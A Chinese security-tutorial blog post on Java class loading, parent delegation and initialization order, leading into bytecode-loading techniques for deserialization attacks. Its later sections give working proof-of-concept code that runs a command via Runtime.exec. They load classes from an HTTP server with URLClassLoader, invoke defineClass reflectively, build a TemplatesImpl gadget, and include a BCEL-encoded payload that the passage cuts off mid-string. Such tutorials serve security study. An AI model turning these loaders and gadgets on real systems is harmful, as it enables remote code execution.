# Java反序列化基础篇-05-类的动态加载

## 0x01 前言

这篇文章/笔记的话，打算从类加载器，双亲委派到代码块的加载顺序这样来讲。最后才是加载字节码。

## 0x02 类加载器及双亲委派

- 说类加载器有些师傅可能没听过，但是说 Java ClassLoader，相信大家耳熟能详。

### 1. 类加载器有什么用

- 加载 Class 文件

以这段简单代码为例

JAVA

```
Student student = new Student();
```

我们知道，Student 本身其实是一个抽象类，是通过 new 这个操作，将其实例化的，**类加载器**做的便是这个工作。

ClassLoader 的工作如图所示

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderWork.png)

加载器也分多种加载器，每个加载器负责不同的功能。

主要分为这四种加载器

> 1. 虚拟机自带的加载器
> 2. 启动类（根）加载器
> 3. 扩展类加载器
> 4. 应用程序加载器

### 2. 几种加载器

#### 引导类加载器

> 引导类加载器(BootstrapClassLoader)，底层原生代码是 C++ 语言编写，属于 JVM 一部分。

不继承 `java.lang.ClassLoader` 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 `/jre/lib/rt.jar` 目录当中。(同时处于安全考虑，`BootstrapClassLoader` 只加载包名为 `java`、`javax`、`sun` 等开头的类)。

#### 扩展类加载器（ExtensionsClassLoader）

扩展类加载器(ExtensionsClassLoader)，由 `sun.misc.Launcher$ExtClassLoader` 类实现，用来在 `/jre/lib/ext` 或者 `java.ext.dirs` 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。

#### App类加载器（AppClassLoader）

App类加载器/系统类加载器（AppClassLoader），由 `sun.misc.Launcher$AppClassLoader` 实现，一般通过通过( `java.class.path` 或者 `Classpath` 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 `ClassLoader.getSystemClassLoader()` 来获取它。

### 3. 双亲委派机制

- 在 Java 开发当中，双亲委派机制是从安全角度出发的。

我们这里以代码先来感受一下，双亲委派机制确实牛逼。

#### 从报错的角度感受双亲委派机制

- 尽量别尝试，看看就好了。要不然整个文件夹挺乱的，如果想上手尝试一下的话，我建议是新建一个项目，不要把其他的文件放一起。

新建一个 **java.lang的文件夹**，在其中新建 **String.java** 的文件。

**String.java**

JAVA

```
package java.lang;  
  
// 双亲委派的错误代码  
public class String {  
  
    public String toString(){  
        return "hello";  
 }  
  
    public static void main(String[] args) {  
        String s = new String();  
 s.toString();  
 }  
}
```

看着是不是没有问题，没有错误吧？
我们自己定义了一个 `java.lang` 的文件夹，并在文件夹中定义了 String.class，还定义了 String 这个类的 toString 方法。我们跑一下程序。（这里如果把 Stirng 类放到其他文件夹会直接报错，原因也是和下面一样的）

- 结果居然报错了！而且非常离谱

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ErrorStringFile.png)

我这不是已经定义了 main 方法吗？？为什么还会报错，这里就提到双亲委派机制了，双亲委派机制是从安全角度出发的。

首先，我们要知道 Java 的类加载器是分很多层的，如图。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderSequence.png)

我们的类加载器在被调用时，也就是在 new class 的时候，它是以这么一个顺序去找的 BOOT —> EXC —-> APP

如果 BOOT 当中没有，就去 EXC 里面找，如果 EXC 里面没有，就去 APP 里面找。

- 所以我们之前报错的程序当中，定义的 `java.lang.String` 在 BOOT 当中是有的，所以我们自定义 String 时，会报错，如果要修改的话，是需要去 rt.jar 里面修改的，这里就不展开了。

#### 从正确的角度感受双亲委派机制

前文提到我们新建的 `java.lang.String` 报错了，是因为我们定义的 String 和 BOOT 包下面的 String 冲突了，所以才会报错，我们这里定义一个 BOOT 和 EXC 都没有的对象试一试。

**在其他的** 文件夹下，新建 **Student.java**

**Student.java**

JAVA

```
package src.DynamicClassLoader;  
  
// 双亲委派的正确代码  
public class Student {  
  
    public String toString(){  
        return "Hello";  
 }  
  
    public static void main(String[] args) {  
        Student student = new Student();  
  
 System.out.println(student.getClass().getClassLoader());  
 System.out.println(student.toString());  
 }  
}
```

并把加载器打印出来

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/SuccessClassFile.png)

我们定义的 Student 类在 APP 加载器中找到了。

## 0x03 各场景下代码块加载顺序

- 这里的代码块主要指的是这四种
  - 静态代码块：`static{}`
  - 构造代码块：`{}`
  - 无参构造器：`ClassName()`
  - 有参构造器：`ClassName(String name)`

### 场景一、实例化对象

这里有两个文件，分别介绍一下用途：

- `Person.java`：一个普普通通的类，里面有静态代码块、构造代码块、无参构造器、有参构造器、静态成员变量、普通成员变量、静态方法。
- `Main.java`：启动类

**Person.java**

JAVA

```
package src.DynamicClassLoader;  
  
// 存放代码块  
public class Person {  
    public static int staticVar;  
 public int instanceVar;  
  
 static {  
        System.out.println("静态代码块");  
 }  
  
    {  
        System.out.println("构造代码块");  
 }  
  
    Person(){  
        System.out.println("无参构造器");  
 }  
    Person(int instanceVar){  
        System.out.println("有参构造器");  
 }  
  
    public static void staticAction(){  
        System.out.println("静态方法");  
 }  
}
```

**Main.java**

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) {  
        Person person = new Person();  
 }  
}
```

运行结果如图

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/InstanceFieldShow.png)

- **结论：**

通过 `new` 关键字实例化的对象，先调用**静态代码块**，然后调用**构造代码块**，最后根据实例化方式不同，调用不同的构造器。

### 场景二、调用静态方法

直接调用类的静态方法

Person.java 不变，修改 Main.java 启动器即可。

**Main.java**

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) {  
        Person.staticAction();  
 }  
}
```

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/StaticAction.png)

- **结论：**

不实例化对象直接调用静态方法，会先调用类中的**静态代码块**，然后调用**静态方法**

### 场景三、对类中的静态成员变量赋值

**Main.java**

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) {  
 		Person.staticVar = 1;  
 	}  
}
```

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ValueStatic.png)

- **结论：**

在对静态成员变量赋值前，会调用**静态代码块**

### 场景四、使用 class 获取类

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) {  
 		Class c = Person.class;  
 	}  
}

// 空屁
```

- **结论：**

利用 `class` 关键字获取类，并不会加载类，也就是什么也不会输出。

### 场景五、使用 forName 获取类

- 这里要抛出异常一下。

我们写三种 `forName` 的方法调用。
修改 **Main.java**

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) throws ClassNotFoundException{  
 		Class.forName("src.DynamicClassLoader.Person");
 	}  
}
// 静态代码块
```

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) throws ClassNotFoundException{   
 	Class.forName("src.DynamicClassLoader.Person", true, ClassLoader.getSystemClassLoader());  
 }  
}
// 静态代码块
```

JAVA

```
package src.DynamicClassLoader;  
  
// 代码块的启动器  
public class Main {  
    public static void main(String[] args) throws ClassNotFoundException{   
 	Class.forName("src.DynamicClassLoader.Person", false, ClassLoader.getSystemClassLoader());
 }  
}
//没有输出
```

- **结论：**

`Class.forName(className)`和`Class.forName(className, true, ClassLoader.getSystemClassLoader())`等价，这两个方法都会调用类中的**静态代码块**，如果将第二个参数设置为`false`，那么就不会调用**静态代码块**

### 场景六、使用 ClassLoader.loadClass() 获取类

**Main.java**

JAVA

```
package com.xiinnn.i.test;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException {
        Class.forName("com.xiinnn.i.test.Person", false, ClassLoader.getSystemClassLoader());
    }
}
//没有输出
```

- **结论：**

`ClassLoader.loadClass()`方法不会进行类的初始化，当然，如果后面再使用`newInstance()`进行初始化，那么会和`场景一、实例化对象`一样的顺序加载对应的代码块。

## 0x04 动态加载字节码

- 在说动态加载字节码之前，先明确一下何为字节码。

### 1. 字节码的概念

什么是字节码？

> 严格来说，Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在 .class 文件中。

我个人很喜欢把它比作 Dockerfile 里面，执行命令的一些代码，例如 `entrypoint` 这种。

而字节码的诞生是为了让 JVM 的流通性更强，这是什么意思呢？看图便知。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaBytes.png)

### 2. 类加载器的原理

根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。

代码：

JAVA

```
ClassLoader c = ClassLoader.getSystemClassLoader();  
c.loadClass("BasiClassLoader.Person");
```

打一下断点，调试一下，断点打在 `ClassLoader.loadClass()` 的地方，也就是父类。为什么这么打断点是有原因的，因为最开始我们已知 “Person” 类它是 `Launcher@APPClassLoader`，它里面是有一个 `loadClass()` 方法的，但是它只有一个参数。所以断点下在 `ClassLoader.loadClass()` 之类

开始调试

调试先会走到 `ClassLoader.loadClass()`，这里其实 return 就多给了一个参数为 false；我们 ctrl + f7 跟进。又会回到 `Launcher@APPClassLoader` 这里。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/AppClassLoaderGetIN.png)

中间是一些简单的判断安全的过程，这里就不看了，继续往下走，直到 `return (super.loadClass(name, resolve));` 这里，继续跟进。也就是回到了之前的 `ClassLoader` 类。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/SecondClassLoader.png)

往下走，先检查类是否加载过，这里其实就是双亲委派的流程了。我们之前说委派机制是从最下面网上找，如果上面有就调用上面的，如果上面没有，就调用本身，也就是 AppClassLoader

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ParentLoader01.png)

这里 null 是因为最上面的 Bootstrap 类是 native 类，也就是之前说过的 C 写的源码，所以为 null。

继续往下走，因为 APP 和 Ext 的父类是 URLClassLoader，所以这里的 findClass() 是会去找到 URLClassLoader 的。

接着在 URLClassLoader 里面调用了 defineClass 方法，再一步步跟进就是我们的 native 方法了。

总的流程:
ClassLoader —-> SecureClassLoader —> URLClassLoader —-> APPClassLoader —-> loadClass() —-> findClass()

下面我们介绍多种能够用于反序列化攻击的，加载字节码的类加载器。

------

> Java 动态字节码的一些用法

### 3. 利用 URLClassLoader 加载远程 class 文件

`URLClassLoader` 实际上是我们平时默认使用的 `AppClassLoader` 的父类，所以，我们解释 `URLClassLoader` 的工作过程实际上就是在解释默认的 `Java `类加载器的工作流程。

正常情况下，Java会根据配置项 `sun.boot.class.path` 和 `java.class.path` 中列举到的基础路径（这些路径是经过处理后的 `java.net.URL` 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：

①：URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 `JarLoader` 来寻找类，即为在Jar包中寻找.class文件

②：URL以斜杠 / 结尾，且协议名是 `file` ，则使用 `FileLoader` 来寻找类，即为在本地文件系统中寻找.class文件

③：URL以斜杠 / 结尾，且协议名不是 `file` ，则使用最基础的 `Loader` 来寻找类。

我们一个个看

#### file 协议

我们在目录下新建一个 Calc.java 的文件。

JAVA

```
package src;  
  
import java.io.IOException;  
  
// URLClassLoader 的 file 协议  
public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```

接着，点小锤子编译一下，我们会在 out 的 src 文件夹下发现编译过的 .class 文件。接着，我们进行一下复制的操作，将其复制到 E 盘。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/Copy.png)

接着，我们编写 URLClassLoader 的启动类

JAVA

```
package src.DynamicClassLoader.URLClassLoader;  
  
import java.net.URL;  
import java.net.URLClassLoader;  
  
// URLClassLoader 的 file 协议  
public class FileRce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader urlClassLoader = new URLClassLoader  
                (new URL[]{new URL("file:///E:\\")});  
 Class calc = urlClassLoader.loadClass("src.DynamicClassLoader.URLClassLoader.Calc");  
 calc.newInstance();  
 }  
}
```

成功弹出了计算器

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/FileURLClassLoader.png)

#### HTTP 协议

在 `Calc.class` 文件目录下执行 `python3 -m http.server 9999`，起一个 http 服务。我这里是 E 盘根目录，就在 E 盘起。

接着，我们编写恶意利用类

JAVA

```
package src.DynamicClassLoader.URLClassLoader;  
  
import java.net.URL;  
import java.net.URLClassLoader;  
  
// URLClassLoader 的 HTTP 协议  
public class HTTPRce {  
    public static void main(String[] args) throws Exception{  
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:9999")});  
 Class calc = urlClassLoader.loadClass("src.DynamicClassLoader.URLClassLoader.Calc");  
 calc.newInstance();  
 }  
}
```

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/HTTPURLClassLoader.png)

#### file+jar 协议

先将我们之前的 class 文件打包一下，打包为 jar 文件。

去到源 .class 文件下，别去复制的地方，运行命令

BASH

```
jar -cvf Calc.jar Clac.class
```

接着，我们修改启动器，调用恶意类

JAVA

```
package src.DynamicClassLoader.URLClassLoader;  
  
import java.net.URL;  
import java.net.URLClassLoader;  
  
// URLClassLoader 的 file + jarpublic class JarRce {  
    public static void main(String[] args) throws Exception{  
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:file:///E:\\Calc.jar!/")});  
 Class calc = urlClassLoader.loadClass("src.DynamicClassLoader.URLClassLoader.Calc");  
 calc.newInstance();  
  
 }  
}
```

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JarFileURLClassLoader.png)

#### HTTP + jar 协议

JAVA

```
package src.DynamicClassLoader.URLClassLoader;  
  
import java.net.URL;  
import java.net.URLClassLoader;  
  
// URLClassLoader 的 HTTP + jarpublic class HTTPJarRce {  
    public static void main(String[] args) throws Exception{  
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:http://127.0.0.1:9999/Calc.jar!/")});  
 Class calc = urlClassLoader.loadClass("src.DynamicClassLoader.URLClassLoader.Calc");  
 calc.newInstance();  
 }  
}
```

- 成功弹出计算器

最灵活的肯定是 http 协议的加载

### 4. 利用 ClassLoader#defineClass 直接加载字节码

不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaRun.png)

从前面的分析可知：

- `loadClass()` 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的`findClass()`方法；
- `findClass()` 根据URL指定的方式来加载类的字节码，其中会调用`defineClass()`；
- `defineClass` 的作用是处理前面传入的字节码，将其处理成真正的 Java 类
  所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java

默认的 `ClassLoader#defineClass` 是一个 native 方法，逻辑在 JVM 的C语言代码中。

我们跟进 ClassLoader 当中，去看一看 `DefineClass` 是怎么被调用的。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/DefineClass.png)

解释一下 `defineClass`

`name`为类名，`b`为字节码数组，`off`为偏移量，`len`为字节码数组的长度。

因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 `defineClass()` 方法进行字节码的加载，然后实例化之后即可弹 shell

我们编写如下代码

JAVA

```
package src.DynamicClassLoader.DefineClass;  
  
import java.lang.reflect.Method;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
// 利用 ClassLoader#defineClass 直接加载字节码  
public class DefineClassRce {  
    public static void main(String[] args) throws Exception{  
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();  
 Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);  
 method.setAccessible(true);  
 byte[] code = Files.readAllBytes(Paths.get("E:\\Calc.class")); // 字节码的数组  
 Class c = (Class) method.invoke(classLoader, "src.Calc", code, 0, code.length);  
 c.newInstance();  
 }  
}
```

- 成功弹出计算器，如果报错的话，看一看 invoke 方法调用时的 “Calc” 位置是否正确。

使用`ClassLoader#defineClass`直接加载字节码有个优点就是不需要出网也可以加载字节码，但是它也是有缺点的，就是需要设置`m.setAccessible(true);`，这在平常的反射中是无法调用的。

在实际场景中，因为 `defineClass` 方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 `TemplatesImpl` 的基石。

### 5. Unsafe 加载字节码

- Unsafe中也存在`defineClass()`方法，本质上也是 `defineClass` 加载字节码的方式。

跟进去看一看 `Unsafe` 的 `defineClass()` 方法

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/UnsafeClassLoader.png)

这里的 `Unsafe` 方法，是采用单例模式进行设计的，所以虽然是 public 方法，但无法直接调用，因为我们用反射来调用它。

JAVA

```
package src.DynamicClassLoader.UnsafeClassLoader;  
  
import sun.misc.Unsafe;  
  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.security.ProtectionDomain;  
  
public class UnsafeClassLoaderRce {  
    public static void main(String[] args) throws Exception{  
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();  
 Class<Unsafe> unsafeClass = Unsafe.class;  
 Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");  
 unsafeField.setAccessible(true);  
 Unsafe classUnsafe = (Unsafe) unsafeField.get(null);  
 Method defineClassMethod = unsafeClass.getMethod("defineClass", String.class, byte[].class,  
 int.class, int.class, ClassLoader.class, ProtectionDomain.class);  
 byte[] code = Files.readAllBytes(Paths.get("E:\\Calc.class"));  
 Class calc = (Class) defineClassMethod.invoke(classUnsafe, "src.Calc", code, 0, code.length, classLoader, null);  
 calc.newInstance();  
 }  
}
```

### 6. TemplatesImpl 加载字节码

- 我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplateImplBag.png)

可以看到在 `TemplatesImpl` 类中还有一个内部类 `TransletClassLoader`，这个类是继承 `ClassLoader`，并且重写了 `defineClass` 方法。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplateImplCode.png)

- 简单来说，这里的 `defineClass` 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。

我们从 `TransletClassLoader#defineClass()` 向前追溯一下调用链：

JAVA

```
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

追到最前面两个方法 `TemplatesImpl#getOutputProperties()` 和 `TemplatesImpl#newTransformer()` ，这两者的作用域是public，可以被外部调用。

我们尝试用 `TemplatesImpl#newTransformer()` 构造一个简单的 POC

首先先构造字节码，注意，这里的字节码必须继承`AbstractTranslet`，因为继承了这一抽象类，所以必须要重写一下里面的方法。

JAVA

```
package src.DynamicClassLoader.TemplatesImplClassLoader;  
  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
import java.io.IOException;  
  
// TemplatesImpl 的字节码构造  
public class TemplatesBytes extends AbstractTranslet {  
    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException{}  
    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}  
    public TemplatesBytes() throws IOException{  
        super();  
 Runtime.getRuntime().exec("Calc");  
 }  
}
```

字节码这里的编写比较容易，我就一笔带过了，接下来我们重点关注 POC 是如何编写出来的。

因为是一整条链子，参考最开始我们讲的 URLDNS 链，我们需要设置其一些属性值，从而让我们的链子传递下去。我这里先把 POC 挂出来，结合着讲。

JAVA

```
package src.DynamicClassLoader.TemplatesImplClassLoader;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
// 主程序  
public class TemplatesRce {  
    public static void main(String[] args) throws Exception{  
        byte[] code = Files.readAllBytes(Paths.get("E:\\JavaClass\\TemplatesBytes.class"));  
 TemplatesImpl templates = new TemplatesImpl();  
 setFieldValue(templates, "_name", "Calc");  
 setFieldValue(templates, "_bytecodes", new byte[][] {code});  
 setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
 templates.newTransformer();  
 }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{  
        Field field = obj.getClass().getDeclaredField(fieldName);  
 field.setAccessible(true);  
 field.set(obj, value);  
 }  
}
```

我们定义了一个设置私有属性的方法，命名为 `setFieldValue`，根据我们的链子，一个个看。

> TemplatesImpl#getOutputProperties() ->
> TemplatesImpl#newTransformer() ->
> TemplatesImpl#getTransletInstance() ->
> TemplatesImpl#defineTransletClasses() ->
> TransletClassLoader#defineClass()

- 主要是三个私有类的属性

  JAVA

  ```
  setFieldValue(templates, "_name", "Calc"); 
  ```

  

显然，`_name` 不能为 null，我们才能进入链子的下一部分。
链子的下一部分为 `defineTransletClasses`，我们跟进去。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/defineTransletClasses.png)

`_tfactory` 需要是一个 `TransformerFactoryImpl` 对象，因为 `TemplatesImpl#defineTransletClasses()` 方法里有调用到 `_tfactory.getExternalExtensionsMap()` ，如果是 null 会出错。

弹计算器成功

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplatesImplSuccess.png)

### 7. 利用 BCEL ClassLoader 加载字节码

- 什么是 BCEL？

BCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。

我们可以通过 BCEL 提供的两个类 `Repository` 和 `Utility` 来利用： `Repository` 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； `Utility` 用于将原生的字节码转换成BCEL格式的字节码：

我们还是用之前写过的 `Calc.java` 这个类。

JAVA

```
package src.DynamicClassLoader.URLClassLoader;  
  
import java.io.IOException;  
   
public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```

这样子的代码是可以成功弹计算器了，但是我们发现有一堆乱码，处理一下。

![img](https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/BCELRce.png)

这一堆特殊的代码，BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。我们修改一下 POC

- 注意这里的 ClassLoader 包不要导错了。

JAVA

```
package src.DynamicClassLoader.BCELClassLoader;  
  
import com.sun.org.apache.bcel.internal.util.ClassLoader;  
  
// 修改过滤乱码  
public class BCELSuccessRce {  
    public static void main(String[] args) throws Exception{  
        new ClassLoader().loadClass("$$BCEL$$" + "$l$8b$I$A$A$A$A$A$A$A$8dQMO$db$40$Q$7d$9b8$b1c$i$C$81$f0$d1$PhK$81$QU$f5$a57$Q$97$ARU$D$V$Bz$de$y$ab$b0$d4$b1$p$7b$83$e0$X$f5$cc$85$o$O$fd$B$fc$u$c4$ecBi$a4$f6PK$9e$f1$7b3$f3$e6$ad$f7$ee$fe$f6$X$80OX$f1$e1a$d6$c7$i$e6$3d$bc0$f9$a5$8bW$3eJx$edb$c1$c5$oCyC$rJo2$U$9bk$c7$MN$3b$3d$91$M$b5H$rro$d8$ef$ca$ec$90wcb$eaQ$wx$7c$cc3e$f0$T$e9$e8S$953$7c$88$f2L$84$5b$97$J$ef$x$d1$8ey$9eG$v$3f$91Yxt$Q$8d$c26$8f$c5$3a$83$b7$n$e2$a7$a5$8cD$g$d1$Z$3f$e7$a1J$c3$cf$fb$db$XB$O$b4J$Tj$abv4$X$dfw$f9$c0$$$p$df$M$7e$t$jfB$ee$u$b3$bcb$e4$3e$9a$d9$A$V$f8$$$de$Ex$8bw$e4$8a$8c$8a$AKx$cf0$f5$P$ed$A$cb$f0$ZZ$ffo$9aa$c2$ea$c4$3c$e9$85$fb$dd3$v4$c3$e4$l$ea$60$98h$d5$tO$7eO$eag$d0h$aeE$7f$f5$d0$c1$iy$nIr$b59R$ed$e8L$r$bd$f5$d1$81$afY$wd$9e$d3$40m$40Em$7f$c7a$c6$85$a4c$bat$b1$e6$v$80$99$c3S$i$p$URf$94K$ad$9f$60W$b6$iP$y$5b$b2$8c$w$c5$e0$b1$B$e3$a8Q$f60$f1$3c$cc$ad$YP$bfA$a1$5e$bc$86$f3$ed$H$bc$_$adk$94$af$y_$a1$d9$S$8aVq$86$be$Mc$b8$80$U$aa$a40I$f1$f7$86$w$i$c2uBS$f4$ba$uD$$$a6$j$w4$ac$a9$99$H$X$f0$d